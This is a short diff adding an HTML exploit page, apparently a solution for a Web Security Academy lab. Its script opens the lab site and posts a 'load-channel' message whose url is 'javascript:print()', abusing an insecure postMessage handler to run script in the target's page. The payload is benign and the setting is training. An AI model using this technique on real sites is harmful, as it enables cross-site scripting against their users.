@@ -1,0 +1,19 @@
+<html>
+    <head>
+    </head>
+
+    <body>
+        <script>
+            let win = window.open('https://0a2b00cc032c112a8099c694005200d2.web-security-academy.net/');
+            let msg = {
+                "type": "load-channel",
+                "url": "javascript:print()"
+            }
+
+            setTimeout(function(){
+                win.postMessage(JSON.stringify(msg), '*')
+            }, 4000)
+            
+        </script>
+    </body>
+</html>
